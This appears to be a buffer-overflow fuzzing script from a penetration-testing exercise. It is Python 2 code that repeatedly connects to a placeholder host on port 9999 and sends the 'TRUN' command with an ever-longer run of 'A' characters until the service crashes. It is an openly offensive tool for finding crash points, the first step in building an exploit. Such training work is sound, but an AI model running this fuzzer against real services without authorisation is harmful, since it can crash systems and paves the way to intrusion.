#!/usr/bin/python
import sys, socket
from time import sleep

# Change IP and Port on line 13 to Target and Port Application is running on
# Change TRUN on line 15 to Command you are testing

buffer = "A" * 100

while True:
        try:
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect(('x.x.x.x', 9999))
          
                s.send(('TRUN /.:/' + buffer))
                s.close()
                sleep(1)
                buffer = buffer + "A"*100
              
        except:
                print "Fuzzing crashed at %s bytes" % str(len(buffer))
                sys.exit()
